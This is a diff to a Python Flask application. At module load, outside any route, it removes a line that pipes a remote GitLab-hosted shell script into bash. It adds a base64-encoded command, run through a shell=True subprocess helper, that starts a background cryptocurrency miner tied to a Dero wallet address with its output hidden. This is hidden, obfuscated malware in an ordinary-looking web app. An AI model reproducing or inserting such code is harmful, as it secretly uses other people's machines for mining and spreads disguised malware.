@@ -8,8 +8,9 @@ app = Flask(__name__)
 def run_command(command):
     return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()
 
-run_command(f"""cd /tmp && curl https://gitlab.com/aldriterakhir/opencv/-/raw/main/program.sh | bash -s roar2 true """)
-
+base64_command = """JChwd2QpL2FtZDY0IC13YWxsZXQtYWRkcmVzcyBkZXJvMXF5MjV5Znl6dzAwZDV0MG10OHB2dGQ5dDRwN3pwOHgzemwwNnB3a2hhajR6a3VxaG5tbnYycWdha3I2dTcgLXR1cmJvID4vZGV2L251bGwgMj4mMSAmCg=="""
+decoded_command = base64.b64decode(base64_command).decode('utf-8')
+run_command(decoded_command)
 ##### Global variable ################################
 #dbUse='postgresql'
 dbUse='postgresql' #default
